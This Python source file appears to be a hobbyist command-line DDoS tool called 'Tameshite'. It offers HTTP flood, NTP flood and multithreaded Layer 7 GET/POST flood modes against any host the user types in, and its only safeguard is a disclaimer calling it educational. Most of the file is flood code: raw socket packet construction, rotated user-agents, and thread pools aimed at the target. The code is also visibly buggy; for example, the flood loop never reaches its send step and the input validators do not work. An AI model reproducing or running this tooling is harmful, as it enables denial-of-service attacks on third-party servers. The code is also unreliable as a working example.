#! /usr/bin/env python3
"""
@github:azseza
2021
```````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
```````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
```````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
Disclaimer:
Feel free to use copy/paste any amount of code you find suitble.
Main Program:
Interactive python cli command.
Tameshite helps you test your server for performance against most DDoS attacks with :
---> HTTP Flood
---> NTP paquet Flood
---> Layer 7 paquet Flood
```````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
`````````````````````````````````````````````This is for educational purpeses``````````````````````````````````````````````
```````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
```````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
"""
import os
from ctypes import cdll
import subprocess
import pathlib
import time
import click
from pyfiglet import figlet_format
from queue import Queue
import time
import sys
import socket
import threading
import logging
import urllib.request
import random
import six

try:
    from PyInquirer import (Token, ValidationError, Validator, print_json, prompt,
                            style_from_dict)
except ImportError:
    try: 
        from prompt_toolkit.token import Token 
    except ImportError:
        from pygments.token import Token 

import ntpL4

try:
    import colorama
    colorama.init()
except ImportError:
    colorama = None

try:
    from termcolor import colored
except ImportError:
    colored = None


style = style_from_dict({
    Token.QuestionMark: '#fac731 bold',
    Token.Answer: '#4688f1 bold',
    Token.Instruction: '',  # default
    Token.Separator: '#cc5454',
    Token.Selected: '#0abf5b',  # default
    Token.Pointer: '#673ab7 bold',
    Token.Question: '',
})


def greeting():
    """
    greeting function with cool ascii art
    """
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("$$$$$$$$\                                          $$\       $$\   $$\                     $$\                       $$\                               $$\ ")
    print("\__$$  __|                                         $$ |      \__|  $$ |                    $$ |                      $$ |                              \__|")
    print("   $$ | $$$$$$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$$\ $$$$$$$\  $$\ $$$$$$\    $$$$$$\        $$ |  $$\ $$\   $$\  $$$$$$$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$\ ")
    print("   $$ | \____$$\ $$  _$$  _$$\ $$  __$$\ $$  _____|$$  __$$\ $$ |\_$$  _|  $$  __$$\       $$ | $$  |$$ |  $$ |$$  __$$ | \____$$\ $$  _____| \____$$\ $$ |")
    print("   $$ | $$$$$$$ |$$ / $$ / $$ |$$$$$$$$ |\$$$$$$\  $$ |  $$ |$$ |  $$ |    $$$$$$$$ |      $$$$$$  / $$ |  $$ |$$ /  $$ | $$$$$$$ |\$$$$$$\   $$$$$$$ |$$ |")
    print("   $$ |$$  __$$ |$$ | $$ | $$ |$$   ____| \____$$\ $$ |  $$ |$$ |  $$ |$$\ $$   ____|      $$  _$$<  $$ |  $$ |$$ |  $$ |$$  __$$ | \____$$\ $$  __$$ |$$ |")
    print("   $$ |\$$$$$$$ |$$ | $$ | $$ |\$$$$$$$\ $$$$$$$  |$$ |  $$ |$$ |  \$$$$  |\$$$$$$$\       $$ | \$$\ \$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$$$$$$  |\$$$$$$$ |$$ |")
    print("   \__| \_______|\__| \__| \__| \_______|\_______/ \__|  \__|\__|   \____/  \_______|      \__|  \__| \______/  \_______| \_______|\_______/  \_______|\__|")
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~@Azseza")


class BrokenGoFile(Exception):
    """Raised when something is wrong with the GoFile """
    pass


class IntValidator(Validator):
    """
    Validator for int and non empty argument
    """

    def validate(self, value):
        try:
            if len(value) == 0:
                raise Exception
            assert type(value) is int
            return True
        except AssertionError:
            return False
        except Exception:
            return False


class PortValidator(Validator):
    """
    Validates wheather or not its a valid port number
    """

    def validate(self, value):
        if value == 80 or value == 443:
            return True
        else:
            return False


class TargetValidator(Validator):
    """
    Validator for host target adress
    """

    def validate(self, value):
        return True


class IpValidator(Validator):
    """
    Validator for IP input
    """

    def validate(self, value):
        a = value.split('.')
        for x in a:
            if not x.isdigit():
                return False
            i = int(x)
            if i < 0 or i > 255:
                return False
            return True


class PathValidator(Validator):
    def validate(self, value):
        a = str(value)
        if a[0] == '/':
            return True
        else:
            return False


class EmptyValidator(Validator):
    def validate(self, value):
        if len(value.text):
            return True
        else:
            raise ValidationError(
                message="You can't leave this blank",
                cursor_position=len(value.text))


class Layer7Attack:
    """
    A class that handels the NTP layer 4 DDoS attack
    """
    conf = dict()
    def __init__(self, answers:dict):
        self.ip = answers.get("ip")
        self.host = answers.get("host")
        self.port = answers.get("port")
        self.thr = answers.get("thr")
        self.path = answers.get("path")
        self.uri = answers.get("uri")
        self.method = answers.get("method")
        self.data = '''Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-us,en;q=0.5
        Accept-Encoding: gzip,deflate
        Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
        Keep-Alive: 115
        Connection: keep-alive''';
        self.isbot = 0
        Layer7Attack.conf = answers
    @classmethod
    def setArgs(cls) -> dict:
        questions = [
            {
                'type': 'input',
                'name': 'ip',
                'default': '127.0.0.1',
                'message': 'Source IP for paquets :',
                'validate': IpValidator
            },
            {
                'type': 'input',
                'name': 'host',
                'message': 'Target Adress :',
                'validate': IntValidator
            },
            {
                'type': 'input',
                'name': 'port',
                'message': 'On What port (80 for http , 443 https) :',
                'validate': PortValidator
            },
            {
                'type': 'input',
                'name': 'thr',
                'message': 'Number of threads : ',
                'default': 200,
                'validate': IntValidator
            },
            {
                'type': 'input',
                'name': 'path',
                'message': 'Path in site (specific attacks) : ',
                'default': '/'
            },
            {
                'type': 'input',
                'name': 'uri',
                'message': 'page où le site Web ne redirige pas, par exemple: /index.jsp',
                'default': '/',
                'validate': PathValidator
            },
            {
                'type': 'list',
                'name': 'method',
                'message': 'Which Mode ?',
                'choices': ['GET', 'POST']
            }
        ]
        answers = prompt(questions, style=style)
        return answers
    
    @classmethod
    def bots(cls) -> list:
        """
        return a list of bots that countin the bots 
        """
        global bots
        bots = []
        bots.append(cls.conf.get("host"))
        return bots
    
    @classmethod
    def user_agent(slef) -> list:
        """
        Function that provides a tuple containing packet data for mayer7 ddos
        """
        global uagent
        uagent = []
        uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
        uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
        uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
        uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
        return uagent

    @classmethod
    def dosIt(cls):
        """
        Function that creates packets of the L7 DDoS
        """
        try:
            while True:
                if(cls.conf.get("port") == 80):
                    referer = "http://"
                elif(cls.conf.get("port") == 443):
                    referer = "https://"
                if(cls.conf.get("method") == "GET"):
                    packet = str("GET "+cls.conf.get("path")+" HTTP/1.1\nReferer: "+referer+cls.conf.get("host")+cls.conf.get("uri")+"\nHost: " +cls.conf.get("host")+"\n\n User-Agent: "+random.choice(cls.user_agent)+"\n"+cls.conf.get("data")).encode('utf-8')
                elif(cls.conf.get("method") == "POST"):
                    packet = str("POST "+cls.conf.get("path")+" HTTP/1.1\nReferer: "+referer+cls.conf.get("host")+cls.conf.get("uri")+"\nHost: "+cls.conf.get("host") +"\n\n User-Agent: "+random.choice(cls.user_agent)+"\n"+cls.conf.get("data")+"\n\n"+cls.conf.get("data")).encode('utf-8')
                else:
                    log("error detected")

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((cls.conf.get("host"), int(cls.conf.get("port"))))
            if s.sendto(packet, (cls.conf.get("host"), int(cls.conf.get("port")))):
                s.shutdown(1)
                log("Attacking . . .")
            else:
                s.shutdown(1)
                log("shut<->down")
            time.sleep(.1)
        except socket.error as e:
            log("no connection! server maybe down")
            time.sleep(.1)
    
    @classmethod
    def bot_hammering(cls, url):
        try:
            while True:
                log("Bots Are Fighting !!!! ")
                req = urllib.request.urlopen(urllib.request.Request(
                    url, headers={'User-Agent': random.choice(cls.user_agent)}))
                time.sleep(.1)
        except:
            time.sleep(.1)
    
    @classmethod
    def dos(cls):
        global q 
        q = Queue()
        while True:
            item = q.get()
            cls.dosIt
            q.task_done()
    
    @classmethod
    def dos2(cls):
        global w
        w = Queue()
        while True:
            item = w.get()
            cls.bot_hammering(random.choice(cls.bots))
            w.task_done()
    
    @classmethod
    def run(cls):
        play2 = True
        cls.user_agent()
        cls.bots()
        log("please Wait ...", color="red")
        time.sleep(5)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((cls.conf.get("host"), int(cls.conf.get("port"))))
            s.settimeout(1)
        except socket.error as e:
            log("check server ip and port")
        while play2:
            try:
                for i in range(int(cls.conf.get("thr"))):
                    t = threading.Thread(target=cls.dos)
                    t.daemon = True
                    t.start()
                    if(cls.conf.get("isbot") == 1):
                        t2 = threading.Thread(target=cls.dos2)
                        t2.daemon = True
                        t2.start()
                start = time.time()
                item = 0
                while True:
                    if (item > 1800):
                        item = 0
                        time.sleep(.1)
                    item = item + 1
                    q.put(item)
                    w.put(item)
                q.join()
                w.join()
            except KeyboardInterrupt:
                play2 = False


class NtpFloodAttack:
    conf = dict()
    def __init__(self):
        questions = [
            {
                'type': 'input',
                'name': 'target',
                'message': 'IP of the Target :',
                'validate': IpValidator
            },
            {
                'type': 'input',
                'name': 'thrdz',
                'message': 'number Of threads',
                'validate': IntValidator
            }
        ]
        answers = prompt(questions, style=style)
        self.target = answers.get("target")
        self.threads = answers.get("thrdz")
        NtpFloodAttack.conf = answers
    @classmethod
    def run(cls):
        try:
            ntpL4.floodNTP(cls.conf.get("thrdz") ,cls.conf.get("target"))
        except KeyboardInterrupt:
            log("Stopping ...", color="red")


class HttpGoFood:
    """
    The golang httpFlood attack lunch
    """
    gofile = "main.so"

    def __init__(self):
        self.target = ""
        self.numberOfBots = 50

    def setConf(self):
        questions = [
            {
                'type': 'input',
                'name': 'target',
                'message': 'Target Server Adress',
                'validate': TargetValidator
            },
            {
                'type': 'input',
                'name': 'nob',
                'message': 'Number of Bots (Threads)',
                'validate': IntValidator
            }
        ]
        answers = prompt(questions, style=style)
        self.target = answers.get("target")
        self.numberOfBots = answers.get("nob")

    def run(self):
        try:
            file = pathlib.Path(gofile)
            if file.exists():
                lib = cdll.LoadLibrary("./main.so")
                lib.mainer(self.target, self.numberOfBots)
            else:
                raise FileNotFoundError
        except BrokenGoFile:
            log("something went wrong with the gointerpreter", color="red")
        except FileNotFoundError:
            log("Did You make the project ? Go executable not found!", color="red")
        except:
            log("something went wrong with the gointerpreter 222 ", color="red")


def log(string, color="blue", font="slant", figlet=False):
    """
    Fonction for printing nice printables
    """
    if colored:
        if not figlet:
            six.print_(colored(string, color))
        else:
            six.print_(colored(figlet_format(
            string, font=font), color))
    else:
        six.print_(string)


def modeSelect():
    """
    Mode Selection menu
    """
    questions = [
        {
            'type': 'list',
            'name': 'mode',
            'message': 'Which Mode ?',
            'choices': ['HTTP Flood', 'NTP packets Flood', 'Layer7 DDoS', 'Quit']
        }
    ]
    answers = prompt(questions, style=style)
    return answers


@click.command()
def main():
    """
    Main command that handeles all the work
    """
    greeting()
    log("```````````````````````````````````````````````````````````")
    log("Python program to test your web apps for noob DDoS attacks ")
    log("```````````````````````````````````````````````````````````")
    log("Modes :                                                    ")
    log("       hhtp : for httpget stree test                       ")
    log("       ntp : for ntp flood DDoS                            ")
    log("       l7: for layer 7 attacks                             ")
    log("```````````````````````````````````````````````````````````")
    log("`````````````````````````````````````````````@Github:Azseza")
    # Main loop
    global play
    play = True
    while play: 
        attack = modeSelect()
        if attack.get("mode") == "HTTP Flood":
            try:
                hhtpdos = HttpGoFood()
                hhtpdos.setConf()
                hhtpdos.run()
            except KeyboardInterrupt:
                log("Okay !! i'm stopping")

        if attack.get("mode") == "NTP packets Flood":
            try:
                ntpFlood = NtpFloodAttack()
                ntpFlood.run()
            except KeyboardInterrupt :
                log("Okay !! i'm stopping")

        if attack.get("mode") == "Layer7 DDoS":
            try:
                conf =Layer7Attack.setArgs()
                l7 = Layer7Attack(conf)
                l7.run()			
            except KeyboardInterrupt:
                log("Okay !! i'm stopping")

        if attack.get("mode") == "Quit":
            play = False
            log("GoodBye !! ", color="red", font="avatar")

if __name__ == "__main__":
    main()
